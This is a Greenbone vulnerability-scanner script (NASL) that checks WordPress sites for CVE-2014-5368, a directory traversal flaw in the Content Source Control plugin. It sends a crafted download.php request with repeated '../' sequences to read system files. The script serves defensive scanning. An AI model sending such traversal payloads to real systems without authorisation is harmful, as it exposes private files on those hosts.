# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804904");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2014-5368");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-09-19 10:28:34 +0530 (Fri, 19 Sep 2014)");
  script_name("WordPress Content Source Control Plugin Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The WordPress plugin 'Content Source Control' is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is possible to read a local file");

  script_tag(name:"insight", value:"Input passed via the 'path' parameter
  to download.php script is not properly sanitized before being returned
  to the user");

  script_tag(name:"impact", value:"Successful exploitation will allow
  attacker to read arbitrary files on the target system.");

  script_tag(name:"affected", value:"WordPress Content Source Control plugin
  version 3.0.0 and earlier.");

  script_tag(name:"solution", value:"Update to version 3.1.0 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2014/q3/407");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/69278");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/95374");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/wp-source-control");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=" + crap(data:"../", length:3*15) + files[file];
  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
